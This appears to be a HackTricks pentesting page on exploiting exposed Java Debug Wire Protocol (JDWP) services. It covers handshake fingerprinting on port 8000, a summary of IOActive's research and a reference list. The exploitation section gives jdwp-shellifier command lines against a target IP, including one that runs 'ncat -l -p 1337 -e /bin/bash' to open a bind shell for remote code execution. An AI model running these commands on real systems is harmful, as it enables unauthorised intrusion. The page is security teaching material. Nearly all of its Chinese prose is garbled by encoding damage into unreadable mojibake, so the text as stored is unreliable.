# Pentesting JDWP - Java Debug Wire Protocol

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åˆ©ç”¨

JDWP åˆ©ç”¨ä¾èµ–äº **åè®®ç¼ºä¹è®¤è¯å’ŒåŠ å¯†**ã€‚å®ƒé€šå¸¸åœ¨ **8000 ç«¯å£**ä¸Šæ‰¾åˆ°ï¼Œä½†å…¶ä»–ç«¯å£ä¹Ÿæ˜¯å¯èƒ½çš„ã€‚åˆå§‹è¿æ¥é€šè¿‡å‘ç›®æ ‡ç«¯å£å‘é€ "JDWP-Handshake" æ¥å»ºç«‹ã€‚å¦‚æœ JDWP æœåŠ¡å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œå®ƒä¼šä»¥ç›¸åŒçš„å­—ç¬¦ä¸²å“åº”ï¼Œç¡®è®¤å…¶å­˜åœ¨ã€‚æ­¤æ¡æ‰‹ä½œä¸ºä¸€ç§æŒ‡çº¹è¯†åˆ«æ–¹æ³•ï¼Œç”¨äºè¯†åˆ«ç½‘ç»œä¸Šçš„ JDWP æœåŠ¡ã€‚

åœ¨è¿›ç¨‹è¯†åˆ«æ–¹é¢ï¼Œåœ¨ Java è¿›ç¨‹ä¸­æœç´¢å­—ç¬¦ä¸² "jdwk" å¯ä»¥æŒ‡ç¤ºä¸€ä¸ªæ´»åŠ¨çš„ JDWP ä¼šè¯ã€‚

é¦–é€‰å·¥å…·æ˜¯ [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°ï¼š
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
æˆ‘å‘ç°ä½¿ç”¨ `--break-on 'java.lang.String.indexOf'` ä½¿å¾—åˆ©ç”¨æ›´åŠ  **ç¨³å®š**ã€‚å¦‚æœä½ æœ‰æœºä¼šå°†åé—¨ä¸Šä¼ åˆ°ä¸»æœºå¹¶æ‰§è¡Œå®ƒï¼Œè€Œä¸æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œåˆ©ç”¨å°†ä¼šæ›´åŠ ç¨³å®šã€‚

## æ›´å¤šç»†èŠ‚

**è¿™æ˜¯ [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/) çš„æ‘˜è¦**ã€‚è¯·æŸ¥çœ‹ä»¥è·å–æ›´å¤šç»†èŠ‚ã€‚

1. **JDWP æ¦‚è¿°**ï¼š
- è¿™æ˜¯ä¸€ç§åŸºäºæ•°æ®åŒ…çš„ç½‘ç»œäºŒè¿›åˆ¶åè®®ï¼Œä¸»è¦æ˜¯åŒæ­¥çš„ã€‚
- ç¼ºä¹èº«ä»½éªŒè¯å’ŒåŠ å¯†ï¼Œä½¿å…¶åœ¨æš´éœ²äºæ¶æ„ç½‘ç»œæ—¶å®¹æ˜“å—åˆ°æ”»å‡»ã€‚

2. **JDWP æ¡æ‰‹**ï¼š
- ä½¿ç”¨ç®€å•çš„æ¡æ‰‹è¿‡ç¨‹æ¥å¯åŠ¨é€šä¿¡ã€‚è°ƒè¯•å™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰å’Œè¢«è°ƒè¯•ç¨‹åºï¼ˆæœåŠ¡å™¨ï¼‰ä¹‹é—´äº¤æ¢ä¸€ä¸ª14ä¸ªå­—ç¬¦çš„ASCIIå­—ç¬¦ä¸²â€œJDWP-Handshakeâ€ã€‚

3. **JDWP é€šä¿¡**ï¼š
- æ¶ˆæ¯å…·æœ‰ç®€å•çš„ç»“æ„ï¼ŒåŒ…å«é•¿åº¦ã€IDã€æ ‡å¿—å’Œå‘½ä»¤é›†ç­‰å­—æ®µã€‚
- å‘½ä»¤é›†å€¼èŒƒå›´ä» 0x40 åˆ° 0x80ï¼Œè¡¨ç¤ºä¸åŒçš„æ“ä½œå’Œäº‹ä»¶ã€‚

4. **åˆ©ç”¨**ï¼š
- JDWP å…è®¸åŠ è½½å’Œè°ƒç”¨ä»»æ„ç±»å’Œå­—èŠ‚ç ï¼Œå¸¦æ¥å®‰å…¨é£é™©ã€‚
- æ–‡ç« è¯¦ç»†æè¿°äº†ä¸€ä¸ªåŒ…å«äº”ä¸ªæ­¥éª¤çš„åˆ©ç”¨è¿‡ç¨‹ï¼ŒåŒ…æ‹¬è·å– Java è¿è¡Œæ—¶å¼•ç”¨ã€è®¾ç½®æ–­ç‚¹å’Œè°ƒç”¨æ–¹æ³•ã€‚

5. **ç°å®ç”Ÿæ´»ä¸­çš„åˆ©ç”¨**ï¼š
- å°½ç®¡å¯èƒ½æœ‰é˜²ç«å¢™ä¿æŠ¤ï¼ŒJDWP æœåŠ¡åœ¨ç°å®åœºæ™¯ä¸­ä»ç„¶å¯è¢«å‘ç°å’Œåˆ©ç”¨ï¼Œæ­£å¦‚åœ¨ ShodanHQ å’Œ GitHub ä¸Šçš„æœç´¢æ‰€ç¤ºã€‚
- åˆ©ç”¨è„šæœ¬å·²åœ¨å„ç§ JDK ç‰ˆæœ¬ä¸Šè¿›è¡Œäº†æµ‹è¯•ï¼Œå¹¶ä¸”æ˜¯å¹³å°æ— å…³çš„ï¼Œæä¾›å¯é çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚

6. **å®‰å…¨å½±å“**ï¼š
- äº’è”ç½‘ä¸Šå¼€æ”¾çš„ JDWP æœåŠ¡çš„å­˜åœ¨å¼ºè°ƒäº†å®šæœŸè¿›è¡Œå®‰å…¨å®¡æŸ¥ã€åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç¦ç”¨è°ƒè¯•åŠŸèƒ½ä»¥åŠé€‚å½“çš„é˜²ç«å¢™é…ç½®çš„å¿…è¦æ€§ã€‚

### **å‚è€ƒæ–‡çŒ®ï¼š**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(ä¸å†æ´»è·ƒ)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (ä¸å†æ´»è·ƒ)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
